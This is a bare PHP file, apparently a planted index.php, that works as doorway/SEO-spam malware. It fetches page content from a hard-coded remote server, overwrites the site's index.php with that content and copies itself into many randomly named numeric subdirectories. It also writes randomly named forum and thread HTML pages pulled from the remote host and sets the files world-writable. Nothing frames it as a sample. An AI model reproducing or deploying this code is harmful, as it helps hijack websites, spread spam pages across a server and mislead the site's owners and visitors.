<?php
error_reporting(0);
set_time_limit(0);
$Remote_server="http://www.655838.com";
$NewFile_content=file_read("index.php");
$ml=$_SERVER['REQUEST_URI'] ;
$str= explode('/',$ml);
$Quantity=count($str)-1; //层数
$host_name=str_replace("index.php","",'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
$B_1=string_n_random(mt_rand(3, 5));
$B_2=string_n_random(mt_rand(2, 5));
$B_3=string_n_random(mt_rand(2, 5));
$B_4=string_n_random(mt_rand(3, 5));
$B_5=string_n_random(mt_rand(2, 5));
$B_6=string_n_random(mt_rand(3, 5));
$B_7=string_n_random(mt_rand(4, 5));
$B_8=string_n_random(mt_rand(2, 5));
$B_9=string_n_random(mt_rand(1, 5));
$B_10=string_n_random(mt_rand(2, 5));
$B_11=string_n_random(mt_rand(3, 5));
$B_12=string_n_random(mt_rand(3, 5));
$B_13=string_n_random(mt_rand(2, 5));
$Branch=$B_1.".".$B_2.".".$B_3.".".$B_4.".".$B_5.".".$B_6.".".$B_7.".".$B_8.".".$B_9.".".$B_10.".".$B_11.".".$B_12.".".$B_13;

session_start();
$allow_sep = "2";
if (isset($_SESSION["post_sep"]))
{
if (time() - $_SESSION["post_sep"] < $allow_sep)
{        exit("请不要反复刷新");
}
else
{     
$_SESSION["post_sep"] = time();
}
}
else{$_SESSION["post_sep"] = time();
}


if ($Quantity<7) 
{

	$Remote_directory = $Remote_server."/d.php"."?type=index.php&host=".$host_name."&directory=".$Branch;
	$Content_directory = Reads($Remote_directory);	
	$Content_mb=Gethtml($Remote_server."/index.php"."?type=index.php&host=".$host_name);	
	echo $Content_mb;
	$Branch_directory=explode('.',$Branch);

for($i = 0; $i < count($Branch_directory); $i++) 
{   
mk_dir("/".$Branch_directory[$i]); 
if(is_dir($Branch_directory[$i])==1)
{
file_write($Branch_directory[$i]."/index.php",$NewFile_content);
}
else
{
echo "目录不存在!!!";   
}
 
}
file_write("index.php",$Content_mb); //生成静态首页



   if(mt_rand(1, 2)==1)
    {
	$html_name="forum-".string_n_random(mt_rand(3, 5))."-".string_n_random(mt_rand(1, 3));	
    }    
   else
    {
	$html_name="index_".string_n_random(mt_rand(3, 5))."-".string_n_random(mt_rand(1, 3))."-".string_n_random(mt_rand(1, 2));
    }

$Content_mb=Gethtml($Remote_server."/index.php"."?type=index.php&host=".$host_name."&html_name=".$html_name."&html_a=html");
file_write($html_name.".html",$Content_mb); //生成静态首页

   if(mt_rand(1, 2)==1)
    {
	$html_name="forum-".string_n_random(mt_rand(3, 5))."-".string_n_random(mt_rand(1, 3));	
    }    
   else
    {
	$html_name="thread-".string_n_random(mt_rand(3, 5))."-".string_n_random(mt_rand(1, 3)."-".string_n_random(mt_rand(1, 2)));
    }

$Content_mb=Gethtml($Remote_server."/index.php"."?type=index.php&host=".$host_name."&html_name=".$html_name."&html_a=html");
file_write($html_name.".html",$Content_mb); //生成静态首页


}
else
{

$Content_mb=Gethtml($Remote_server."/index.php"."?type=index.php&host=".$host_name);	
file_write("index.php",$Content_mb); //生成静态首页
echo $Content_mb;


   if(mt_rand(1, 2)==1)
    {
	$html_name="forum-".string_n_random(mt_rand(3, 5))."-".string_n_random(mt_rand(1, 3));	
    }    
   else
    {
	$html_name="thread-".string_n_random(mt_rand(3, 5))."-".string_n_random(mt_rand(1, 3))."-".string_n_random(mt_rand(1, 2));	
    }

$Content_mb=Gethtml($Remote_server."/index.php"."?type=index.php&host=".$host_name."&html_name=".$html_name."&html_a=html");
file_write($html_name.".html",$Content_mb); //生成静态首页

   if(mt_rand(1, 2)==1)
    {
	$html_name="forum-".string_n_random(mt_rand(3, 5))."-".string_n_random(mt_rand(1, 3));	
    }    
   else
    {
	$html_name="index_".string_n_random(mt_rand(3, 5))."-".string_n_random(mt_rand(1, 3))."-".string_n_random(mt_rand(1, 2));	
    }

$Content_mb=Gethtml($Remote_server."/index.php"."?type=index.php&host=".$host_name."&html_name=".$html_name."&html_a=html");
file_write($html_name.".html",$Content_mb); //生成静态首页

}


function mk_dir($dir) {
    if ( $dir)
    {
        $arr= explode('/',$dir);
        $k = "";
	$n = count($arr);

        for ( $i=1; $i<=$n; $i++)
        {
            $k = $k."/".$arr[$i];
			//echo $k;
            if ( is_dir( ".".$k) || @mkdir(".".$k) )
            {
                continue;
            }
            exit( "请检查文件目录权限" );
        }
    }
}


function string_random($len =4){
    $str ='abcdefghijklmnopqrstuvwxyz1234567890';
    $strlen = strlen($str);
    $randstr = '';
    for ($i = 0; $i<$len; $i++){
        $randstr .= $str[mt_rand(0, $strlen-1)];
    }
    return $randstr;
}

function string_a_random($len =6){
    $str ='abcdefghijklmnopqrstuvwxyz';
    $strlen = strlen($str);
    $randstr = '';
    for ($i = 0; $i<$len; $i++){
        $randstr .= $str[mt_rand(0, $strlen-1)];
    }
    return $randstr;
}

function string_n_random($len =4){
    $str ='1234567890';
    $strlen = strlen($str);
    $randstr = '';
    for ($i = 0; $i<$len; $i++){
        $randstr .= $str[mt_rand(0, $strlen-1)];
    }
    return $randstr;
}


function Gethtml($url){
	$opts = array('http' => array('method' => "GET",'timeout' => 8));
	$context = stream_context_create($opts);
	$html = file_get_contents($url, false, $context);
	if(empty($html)){$html = file_get_contents($url);}
	return $html;
}


function Reads($url){
	$opts_1 = array('http' => array('method' => "GET",'timeout' => 8));
	$context = stream_context_create($opts_1);
	$html = file_get_contents($url, false, $context);
	if(empty($html)){"<p align='center'><font color='red'><b>服务器获取文件内容出错</b></font></p>";}
	return $html;
}


function file_write($path, $data, $method = 'wb',$lock=1) {
    if ($fp = @fopen($path, $method)) {
        if($lock){
            @flock($fp,LOCK_EX);
        }
        fwrite($fp, $data);
        fclose($fp);
        chmod($path, 0777);
        return true;
    }
    return false;
}

function file_read($file){
    if (file_exists($file)) {
        return file_get_contents($file);
    }
    return false;
}

?>